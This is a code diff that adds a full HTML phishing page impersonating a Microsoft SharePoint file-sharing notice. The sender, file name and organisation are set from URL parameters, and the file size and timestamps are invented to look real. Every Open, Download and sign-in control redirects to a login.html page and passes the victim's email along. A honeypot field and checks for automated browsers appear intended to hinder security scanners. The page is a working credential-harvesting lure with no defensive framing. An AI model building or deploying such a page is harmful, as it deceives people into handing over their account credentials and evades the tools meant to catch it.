@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title id="pg-title">Shared file – Microsoft SharePoint</title>
+<!-- SharePoint favicon -->
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='4' fill='%230364b8'/%3E%3Ccircle cx='16' cy='11' r='6' fill='%234f9de8'/%3E%3Ccircle cx='22' cy='20' r='5' fill='%23cce4f6'/%3E%3Ccircle cx='11' cy='22' r='7' fill='white'/%3E%3C/svg%3E">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif;font-size:14px;background:#fff;color:#323130}
+body{min-height:100vh;display:flex;flex-direction:column}
+
+/* ── Header ── */
+header{background:#0364b8;color:#fff;padding:0 24px;height:48px;display:flex;align-items:center;gap:16px;flex-shrink:0}
+.hdr-logo{display:flex;align-items:center;gap:8px}
+.hdr-logo-icon{width:20px;height:20px;flex-shrink:0}
+.hdr-logo-text{font-size:16px;font-weight:600;letter-spacing:-.2px;color:#fff}
+.hdr-sep{width:1px;height:22px;background:rgba(255,255,255,.35);margin:0 4px}
+.hdr-suite{font-size:13px;color:rgba(255,255,255,.85)}
+
+/* ── Nav breadcrumb ── */
+.breadcrumb{background:#fff;border-bottom:1px solid #edebe9;padding:8px 24px;font-size:12px;color:#605e5c;display:flex;align-items:center;gap:6px}
+.breadcrumb a{color:#0364b8;text-decoration:none}
+.breadcrumb a:hover{text-decoration:underline}
+.breadcrumb-sep{color:#c8c6c4}
+
+/* ── Main ── */
+main{flex:1;display:flex;align-items:flex-start;justify-content:center;padding:40px 20px;background:#f3f2f1}
+.container{width:100%;max-width:680px}
+
+/* ── Alert card ── */
+.notif-card{background:#fff;border:1px solid #edebe9;border-radius:2px;box-shadow:0 1.6px 3.6px rgba(0,0,0,.13),0 .3px .9px rgba(0,0,0,.11);overflow:hidden;margin-bottom:16px}
+.notif-header{padding:20px 24px 16px;border-bottom:1px solid #f3f2f1;display:flex;align-items:flex-start;gap:14px}
+.notif-avatar{width:40px;height:40px;border-radius:50%;background:linear-gradient(135deg,#0364b8,#1583e8);display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:700;color:#fff;flex-shrink:0;text-transform:uppercase}
+.notif-from{flex:1}
+.notif-name{font-size:15px;font-weight:600;color:#323130;margin-bottom:2px}
+.notif-action{font-size:13px;color:#605e5c}
+.notif-time{font-size:12px;color:#8a8886;white-space:nowrap;margin-left:auto}
+
+/* ── File card ── */
+.file-card{margin:0 24px 20px;border:1px solid #edebe9;border-radius:2px;display:flex;align-items:stretch;overflow:hidden;transition:box-shadow .1s}
+.file-card:hover{box-shadow:0 2px 8px rgba(0,0,0,.12)}
+.file-thumb{width:80px;background:#f3f2f1;display:flex;align-items:center;justify-content:center;border-right:1px solid #edebe9;flex-shrink:0}
+.file-info{flex:1;padding:14px 16px}
+.file-name{font-size:14px;font-weight:600;color:#0364b8;margin-bottom:4px;word-break:break-word}
+.file-name:hover{text-decoration:underline;cursor:pointer}
+.file-meta{font-size:12px;color:#8a8886;display:flex;gap:12px;flex-wrap:wrap}
+.file-type-badge{display:inline-block;padding:1px 6px;border-radius:2px;font-size:11px;font-weight:600;color:#fff;margin-bottom:6px}
+
+/* ── Message area ── */
+.msg-area{padding:0 24px 16px}
+.msg-label{font-size:12px;color:#8a8886;margin-bottom:6px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
+.msg-text{font-size:14px;color:#323130;background:#f3f2f1;border:1px solid #edebe9;border-radius:2px;padding:12px 14px;line-height:1.5}
+
+/* ── Actions ── */
+.actions{padding:16px 24px;border-top:1px solid #f3f2f1;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.btn-primary{display:inline-flex;align-items:center;gap:6px;background:#0364b8;color:#fff;border:none;border-radius:2px;padding:0 20px;height:32px;font-size:13px;font-family:inherit;font-weight:600;cursor:pointer;text-decoration:none;transition:background .15s}
+.btn-primary:hover{background:#025aa0}
+.btn-secondary{display:inline-flex;align-items:center;gap:6px;background:#fff;color:#323130;border:1px solid #8a8886;border-radius:2px;padding:0 16px;height:32px;font-size:13px;font-family:inherit;cursor:pointer;text-decoration:none;transition:background .15s}
+.btn-secondary:hover{background:#f3f2f1}
+.share-link{margin-left:auto;font-size:12px;color:#605e5c;display:flex;align-items:center;gap:4px}
+
+/* ── Info strip ── */
+.info-strip{padding:10px 24px;background:#eff6fc;border-top:1px solid #c7e0f4;display:flex;align-items:center;gap:10px}
+.info-strip svg{flex-shrink:0;color:#0078d4}
+.info-strip p{font-size:12px;color:#323130;line-height:1.4}
+.info-strip a{color:#0364b8;text-decoration:none}
+.info-strip a:hover{text-decoration:underline}
+
+/* ── Footer ── */
+footer{padding:16px 24px;border-top:1px solid #edebe9;display:flex;flex-wrap:wrap;gap:16px;align-items:center;background:#fff}
+footer a{font-size:11px;color:#8a8886;text-decoration:none}
+footer a:hover{text-decoration:underline}
+.footer-logo{margin-left:auto;display:flex;align-items:center;gap:6px}
+.footer-logo span{font-size:11px;color:#8a8886}
+
+/* ── Bot-trap honeypot ── */
+.hp{position:absolute;left:-9999px;opacity:0;pointer-events:none}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="hdr-logo">
+    <!-- SharePoint icon -->
+    <svg class="hdr-logo-icon" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="16" cy="10" r="8" fill="#4f9de8"/>
+      <circle cx="22" cy="20" r="6" fill="#cce4f6"/>
+      <circle cx="10" cy="22" r="8" fill="white"/>
+    </svg>
+    <span class="hdr-logo-text">SharePoint</span>
+  </div>
+  <div class="hdr-sep"></div>
+  <span class="hdr-suite" id="hdr-org">Organization</span>
+</header>
+
+<div class="breadcrumb">
+  <a href="#" onclick="return false">Home</a>
+  <span class="breadcrumb-sep">›</span>
+  <a href="#" onclick="return false">Shared with me</a>
+  <span class="breadcrumb-sep">›</span>
+  <span id="bc-name">Document</span>
+</div>
+
+<main>
+  <div class="container">
+    <div class="notif-card">
+
+      <div class="notif-header">
+        <div class="notif-avatar" id="avatar">?</div>
+        <div class="notif-from">
+          <div class="notif-name" id="sender-name">Someone</div>
+          <div class="notif-action">shared a file with you</div>
+        </div>
+        <div class="notif-time" id="notif-time">Just now</div>
+      </div>
+
+      <a href="#" id="file-link" onclick="openFile(event)" class="file-card" style="text-decoration:none">
+        <div class="file-thumb" id="file-thumb">
+          <!-- icon rendered by JS -->
+        </div>
+        <div class="file-info">
+          <div id="file-type-badge" class="file-type-badge">DOCX</div>
+          <div class="file-name" id="file-name">Document.docx</div>
+          <div class="file-meta">
+            <span id="file-size">—</span>
+            <span id="file-modified">Modified recently</span>
+            <span id="file-lib">Documents</span>
+          </div>
+        </div>
+      </a>
+
+      <div class="msg-area" id="msg-area" style="display:none">
+        <div class="msg-label">Message</div>
+        <div class="msg-text" id="msg-text"></div>
+      </div>
+
+      <div class="actions">
+        <a href="#" class="btn-primary" id="open-btn" onclick="openFile(event)">
+          <svg width="14" height="14" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M2 2h6v2H4v8h8v-4h2v6H2V2z" fill="white"/>
+            <path d="M9 1h6v6l-2-2-4 4-1.5-1.5 4-4L9 1z" fill="white"/>
+          </svg>
+          Open
+        </a>
+        <button class="btn-secondary" onclick="openFile(event)">
+          <svg width="14" height="14" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M8 1v9M4 7l4 4 4-4M2 12v2h12v-2" stroke="#323130" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          Download
+        </button>
+        <div class="share-link">
+          <svg width="12" height="12" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M11 3a2 2 0 1 1 0 4 2 2 0 0 1 0-4zm0 6a2 2 0 1 1 0 4 2 2 0 0 1 0-4zM5 8a2 2 0 1 1 0 4A2 2 0 0 1 5 8zm0-5a2 2 0 1 1 0 4 2 2 0 0 1 0-4z" fill="#605e5c"/>
+          </svg>
+          Copy link
+        </div>
+      </div>
+
+      <div class="info-strip">
+        <svg width="14" height="14" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="8" cy="8" r="7" stroke="#0078d4" stroke-width="1.5"/>
+          <path d="M8 7v5M8 5v1" stroke="#0078d4" stroke-width="1.5" stroke-linecap="round"/>
+        </svg>
+        <p><strong>Sign in required.</strong> You need to sign in to view this document. <a href="#" onclick="openFile(event)">Sign in with Microsoft</a></p>
+      </div>
+    </div>
+
+    <!-- Honeypot -->
+    <input class="hp" type="text" name="company" tabindex="-1" autocomplete="off">
+  </div>
+</main>
+
+<footer>
+  <a href="https://privacy.microsoft.com/privacystatement" target="_blank">Privacy</a>
+  <a href="#" onclick="return false">Cookie settings</a>
+  <a href="#" onclick="return false">Terms of use</a>
+  <a href="#" onclick="return false">Contact IT</a>
+  <div class="footer-logo">
+    <svg width="16" height="16" viewBox="0 0 23 23" xmlns="http://www.w3.org/2000/svg">
+      <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
+      <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
+      <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
+      <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
+    </svg>
+    <span>Microsoft 365</span>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var sp      = new URLSearchParams(location.search);
+  var rawDoc  = sp.get('doc')  || 'Q3_Financial_Report';
+  var rawFrom = sp.get('from') || 'Michael Thompson';
+  var rawOrg  = sp.get('org')  || 'Your Organization';
+  var rawMsg  = sp.get('msg')  || '';
+  var rawLib  = sp.get('lib')  || 'Shared Documents';
+
+  /* ── File type detection ── */
+  var ext = (rawDoc.match(/\.(\w+)$/) || ['','docx'])[1].toLowerCase();
+  if (!['docx','doc','xlsx','xls','pptx','ppt','pdf','txt','csv'].includes(ext)) { ext = 'docx'; rawDoc = rawDoc + '.docx'; }
+  var extMap = {
+    docx:{ label:'DOCX', color:'#2b579a', name:'Word Document' },
+    doc: { label:'DOC',  color:'#2b579a', name:'Word Document' },
+    xlsx:{ label:'XLSX', color:'#217346', name:'Excel Workbook' },
+    xls: { label:'XLS',  color:'#217346', name:'Excel Workbook' },
+    pptx:{ label:'PPTX', color:'#b7472a', name:'PowerPoint Presentation' },
+    ppt: { label:'PPT',  color:'#b7472a', name:'PowerPoint Presentation' },
+    pdf: { label:'PDF',  color:'#d93025', name:'PDF Document' },
+    txt: { label:'TXT',  color:'#605e5c', name:'Text File' },
+    csv: { label:'CSV',  color:'#217346', name:'CSV File' },
+  };
+  var ft = extMap[ext] || extMap['docx'];
+
+  /* ── Render ── */
+  document.getElementById('hdr-org').textContent = rawOrg;
+  document.getElementById('bc-name').textContent = rawDoc;
+  document.getElementById('sender-name').textContent = rawFrom;
+  document.getElementById('avatar').textContent = (rawFrom[0]||'?').toUpperCase();
+  // Random avatar color from name
+  var colors = ['#0364b8','#107c41','#b7472a','#5c2d91','#0078d4'];
+  var ci = rawFrom.charCodeAt(0) % colors.length;
+  document.getElementById('avatar').style.background = colors[ci];
+
+  document.getElementById('file-name').textContent = rawDoc;
+  document.getElementById('bc-name').textContent   = rawDoc;
+  document.getElementById('file-lib').textContent  = rawLib;
+
+  var badge = document.getElementById('file-type-badge');
+  badge.textContent = ft.label;
+  badge.style.background = ft.color;
+
+  // File icon SVG by type
+  var iconSvgs = {
+    docx: '<svg width="44" height="52" viewBox="0 0 44 52" xmlns="http://www.w3.org/2000/svg"><rect width="44" height="52" rx="3" fill="#2b579a"/><text x="22" y="34" font-family="Segoe UI,Arial,sans-serif" font-size="22" font-weight="700" fill="white" text-anchor="middle">W</text></svg>',
+    xlsx: '<svg width="44" height="52" viewBox="0 0 44 52" xmlns="http://www.w3.org/2000/svg"><rect width="44" height="52" rx="3" fill="#217346"/><text x="22" y="34" font-family="Segoe UI,Arial,sans-serif" font-size="22" font-weight="700" fill="white" text-anchor="middle">X</text></svg>',
+    pptx: '<svg width="44" height="52" viewBox="0 0 44 52" xmlns="http://www.w3.org/2000/svg"><rect width="44" height="52" rx="3" fill="#b7472a"/><text x="22" y="34" font-family="Segoe UI,Arial,sans-serif" font-size="22" font-weight="700" fill="white" text-anchor="middle">P</text></svg>',
+    pdf:  '<svg width="44" height="52" viewBox="0 0 44 52" xmlns="http://www.w3.org/2000/svg"><rect width="44" height="52" rx="3" fill="#d93025"/><text x="22" y="34" font-family="Segoe UI,Arial,sans-serif" font-size="14" font-weight="700" fill="white" text-anchor="middle">PDF</text></svg>',
+  };
+  var thumb = document.getElementById('file-thumb');
+  thumb.innerHTML = iconSvgs[ext] || iconSvgs['docx'];
+
+  // Random file size
+  var sizes = ['142 KB','896 KB','2.4 MB','387 KB','1.1 MB','4.8 MB'];
+  document.getElementById('file-size').textContent = sizes[rawDoc.length % sizes.length];
+
+  // Relative time
+  var times = ['2 minutes ago','14 minutes ago','1 hour ago','Just now','3 hours ago'];
+  document.getElementById('notif-time').textContent = times[rawFrom.length % times.length];
+  document.getElementById('file-modified').textContent = 'Modified ' + times[rawDoc.length % times.length];
+
+  // Message
+  if (rawMsg) {
+    document.getElementById('msg-area').style.display = '';
+    document.getElementById('msg-text').textContent = rawMsg;
+  }
+
+  /* ── Open → sign in ── */
+  function openFile(e) {
+    if (e) e.preventDefault();
+    var destEmail = encodeURIComponent(rawFrom.indexOf('@') > 0 ? rawFrom : '');
+    location.href = 'login.html?ctx=sharepoint' + (destEmail ? '&hint=' + destEmail : '') + '&_t=' + Date.now();
+  }
+  window.openFile = openFile;
+
+  /* ── Bot detection ── */
+  if (navigator.webdriver || window.callPhantom || window._phantom) { return; }
+
+  /* ── Page title ── */
+  document.getElementById('pg-title').textContent = rawDoc + ' – Microsoft SharePoint';
+})();
+</script>
+</body>
+</html>
